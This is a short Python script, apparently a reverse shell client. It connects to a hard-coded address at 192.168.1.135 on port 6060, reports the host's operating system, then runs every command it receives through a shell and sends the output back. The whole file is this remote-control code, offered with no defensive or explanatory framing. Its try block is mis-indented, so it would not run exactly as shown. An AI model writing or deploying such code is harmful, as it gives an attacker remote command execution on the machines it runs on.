from socket import *
import os, platform, subprocess

ip = "192.168.1.135"
port = 6060
platf = platform.system().encode()

s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))
s.send(platf)

while True:
    try:
    comm = s.recv(1024).decode()
    comm_execute = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sdc = f"command: {comm} not found"
    if comm.startswith("cd "):
        comm = comm.replace("cd ", "")
        os.chdir(comm)
        sdc = comm
    else:
        sdc = comm_execute.stdout.read().decode()
        
    s.send(sdc.encode())
    print(sdc)
    except:
        break
